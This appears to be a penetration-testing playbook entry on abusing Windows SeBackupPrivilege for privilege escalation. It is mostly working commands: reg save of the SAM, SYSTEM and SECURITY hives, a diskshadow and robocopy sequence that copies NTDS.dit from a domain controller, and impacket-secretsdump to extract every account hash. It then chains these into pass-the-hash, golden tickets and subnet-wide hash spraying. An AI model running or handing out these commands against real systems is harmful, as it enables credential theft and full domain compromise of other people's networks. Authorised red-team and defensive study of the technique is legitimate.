---
id: windows-sebackup
title: SeBackupPrivilege
stage: privesc
tags: [windows, ad]
summary: Use SeBackupPrivilege to bypass ACLs and read any file — dump SAM/SYSTEM for local hashes, or dump NTDS.dit from a DC for every domain account hash.
leads_to:
  - pass-the-hash
  - domain-admin
  - dcsync
---

## Prerequisites

A shell with `SeBackupPrivilege` enabled — common on Backup Operators group members and some service accounts. `whoami /priv` must show this privilege as Enabled. On a DC, this gives you the entire domain.

SeBackupPrivilege grants the right to read any file regardless of its DACL — it's designed for backup software. This means SAM, SYSTEM, SECURITY (local hashes on any machine), and NTDS.dit (domain hashes on a DC) are all readable. The `reg save` method works from any cmd prompt; NTDS.dit on a DC requires diskshadow to work around the exclusive file lock.

## Quick Win

> Check the privilege, dump SAM/SYSTEM immediately — two commands and you have local hashes.

```cmd
whoami /priv | findstr /i "SeBackupPrivilege"
reg save HKLM\SAM C:\Temp\SAM && reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

## Dump SAM / SYSTEM (Any Machine)

> Extract local account hashes — Administrator hash lets you PTH to other machines.

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

```bash
# Transfer files to attacker, then extract hashes
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

## Dump NTDS.dit (DC Only — Full Domain Hashes)

> diskshadow creates a VSS copy that isn't locked — required because ntds.dit is in use.

```powershell
# Create shadow.txt on target:
# set verbose on
# set metadata C:\Temp\meta.cab
# set context clientaccessible
# begin backup
# add volume C: alias cdrive
# create
# expose %cdrive% Z:
# end backup

diskshadow /s C:\Temp\shadow.txt

# Copy ntds.dit from the shadow
robocopy /b Z:\Windows\NTDS\ C:\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

```bash
# Transfer both to attacker, then dump all domain hashes
impacket-secretsdump -ntds C:\Temp\ntds.dit -system C:\Temp\SYSTEM LOCAL
```

## Leads To

SAM + SYSTEM dump → local Administrator hash → pass-the-hash laterally. NTDS.dit from DC → every domain account hash → domain-admin. krbtgt hash from NTDS dump → golden-ticket persistence. Spray Administrator hash across subnet → `nxc smb` + hash → access to all domain machines sharing local admin password.
